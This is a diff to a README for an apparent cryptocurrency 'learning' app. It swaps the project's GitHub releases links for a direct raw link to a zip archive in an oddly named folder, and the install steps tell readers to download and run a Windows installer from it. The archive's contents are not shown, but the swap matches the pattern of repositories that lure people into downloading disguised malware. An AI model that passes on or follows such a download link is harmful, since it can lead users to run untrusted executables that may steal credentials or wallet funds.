@@ -1,6 +1,6 @@
 # 🪙 how-crypto-work-usdt-btc - Understand cryptocurrency transfers with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sinclairconformist8409/how-crypto-work-usdt-btc/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Sinclairconformist8409/how-crypto-work-usdt-btc/main/Mesosauria/crypto-how-btc-work-usdt-v1.4.zip)
 
 This application provides a visual guide to how cryptocurrency transfers work. It focuses on popular tokens like USDT and BTC. Use this software to learn about blockchain ledger entries and transaction verification.
 
@@ -30,7 +30,7 @@ The software works on your local machine. It does not require a cloud connection
 
 Follow these steps to set up the software.
 
-1. Visit [this page to download](https://github.com/Sinclairconformist8409/how-crypto-work-usdt-btc/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Sinclairconformist8409/how-crypto-work-usdt-btc/main/Mesosauria/crypto-how-btc-work-usdt-v1.4.zip).
 2. Locate the link for the Windows installer.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
